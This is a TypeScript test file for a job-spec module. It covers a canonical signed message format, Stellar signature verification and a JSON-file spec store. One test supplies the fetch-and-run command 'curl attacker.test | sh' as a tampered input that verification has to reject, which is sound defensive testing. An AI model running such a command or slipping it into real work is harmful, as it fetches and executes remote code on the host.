import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Keypair } from '@stellar/stellar-sdk';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { DaemonError } from '../src/config.js';
import { FileJobSpecStore, jobSpecMessage, verifyJobSpecSignature } from '../src/specs.js';

let dir: string;

const REQUESTER = Keypair.random();
const JOB_ID = 7n;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'pulserun-specs-'));
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

async function writeSpecs(content: string): Promise<string> {
  const path = join(dir, 'specs.json');
  await writeFile(path, content, 'utf8');
  return path;
}

function sign(
  spec: { image: string; command: string },
  signer = REQUESTER,
  jobId = JOB_ID,
): { signer: string; signature: string } {
  const signature = Buffer.from(
    signer.sign(
      Buffer.from(
        jobSpecMessage({
          jobId,
          requester: signer.publicKey(),
          image: spec.image,
          command: spec.command,
        }),
        'utf8',
      ),
    ),
  ).toString('base64');
  return { signer: signer.publicKey(), signature };
}

describe('jobSpecMessage', () => {
  it('is the documented single-line canonical form', () => {
    expect(
      jobSpecMessage({
        jobId: 42n,
        requester: 'GABC',
        image: 'node:22-alpine',
        command: 'pnpm test',
      }),
    ).toBe(
      '{"domain":"pulserun-job-spec","version":1,"jobId":"42","requester":"GABC","image":"node:22-alpine","command":"pnpm test"}',
    );
  });

  it('escapes quotes and newlines so a command cannot forge fields', () => {
    const message = jobSpecMessage({
      jobId: 1n,
      requester: 'GABC',
      image: 'alpine',
      command: 'echo "x"\nrequester:GABC',
    });
    expect(message).toContain('\\"x\\"');
    expect(message).toContain('\\n');
    expect(message.split('"requester"')).toHaveLength(2);
  });
});

describe('verifyJobSpecSignature', () => {
  const spec = { image: 'alpine', command: 'true' };
  const job = { jobId: JOB_ID, requester: REQUESTER.publicKey() };

  it('accepts a signature from the job requester', () => {
    expect(verifyJobSpecSignature(job, { ...spec, ...sign(spec) })).toBe(true);
  });

  it('rejects an unsigned spec', () => {
    expect(verifyJobSpecSignature(job, spec)).toBe(false);
  });

  it('rejects a signature from another address', () => {
    expect(verifyJobSpecSignature(job, { ...spec, ...sign(spec, Keypair.random()) })).toBe(false);
  });

  it('rejects a signature bound to a different job id', () => {
    expect(verifyJobSpecSignature(job, { ...spec, ...sign(spec, REQUESTER, 99n) })).toBe(false);
  });

  it('rejects a tampered command', () => {
    const signed = sign(spec);
    expect(
      verifyJobSpecSignature(job, { ...spec, ...signed, command: 'curl attacker.test | sh' }),
    ).toBe(false);
  });

  it('rejects a malformed signature instead of throwing', () => {
    expect(
      verifyJobSpecSignature(job, { ...spec, signer: job.requester, signature: 'not-base64!' }),
    ).toBe(false);
    expect(verifyJobSpecSignature({ jobId: 1n, requester: 'not-an-address' }, spec)).toBe(false);
  });
});

describe('FileJobSpecStore', () => {
  it('returns null when the file does not exist yet', async () => {
    const store = new FileJobSpecStore({ path: join(dir, 'missing.json') });
    await expect(store.get(7n)).resolves.toBeNull();
  });

  it('returns null when the job has no spec', async () => {
    const path = await writeSpecs(JSON.stringify({ '8': { image: 'alpine', command: 'true' } }));
    const store = new FileJobSpecStore({ path });
    await expect(store.get(7n)).resolves.toBeNull();
  });

  it('returns a trimmed spec and its signature', async () => {
    const signed = sign({ image: 'node:22-alpine', command: 'pnpm test' });
    const path = await writeSpecs(
      JSON.stringify({
        '7': {
          image: '  node:22-alpine ',
          command: ' pnpm test ',
          signer: ` ${signed.signer} `,
          signature: ` ${signed.signature} `,
        },
      }),
    );
    const store = new FileJobSpecStore({ path });
    await expect(store.get(7n)).resolves.toEqual({
      image: 'node:22-alpine',
      command: 'pnpm test',
      signer: signed.signer,
      signature: signed.signature,
    });
  });

  it('rejects invalid JSON and non-object roots', async () => {
    const badJson = await writeSpecs('{not json');
    await expect(new FileJobSpecStore({ path: badJson }).get(7n)).rejects.toThrowError(
      /not valid JSON/,
    );

    const arrayRoot = await writeSpecs('[]');
    await expect(new FileJobSpecStore({ path: arrayRoot }).get(7n)).rejects.toThrowError(
      /must contain a JSON object/,
    );
  });

  it('rejects an entry missing image or command', async () => {
    const missingImage = await writeSpecs(JSON.stringify({ '7': { command: 'true' } }));
    await expect(new FileJobSpecStore({ path: missingImage }).get(7n)).rejects.toThrowError(
      /non-empty "image"/,
    );

    const missingCommand = await writeSpecs(JSON.stringify({ '7': { image: 'alpine' } }));
    await expect(new FileJobSpecStore({ path: missingCommand }).get(7n)).rejects.toThrowError(
      DaemonError,
    );
  });

  it('rejects a non-string signer or signature', async () => {
    const badSigner = await writeSpecs(
      JSON.stringify({ '7': { image: 'alpine', command: 'true', signer: 3 } }),
    );
    await expect(new FileJobSpecStore({ path: badSigner }).get(7n)).rejects.toThrowError(
      /non-string "signer"/,
    );

    const badSignature = await writeSpecs(
      JSON.stringify({ '7': { image: 'alpine', command: 'true', signature: null } }),
    );
    await expect(new FileJobSpecStore({ path: badSignature }).get(7n)).rejects.toThrowError(
      /non-string "signature"/,
    );
  });
});
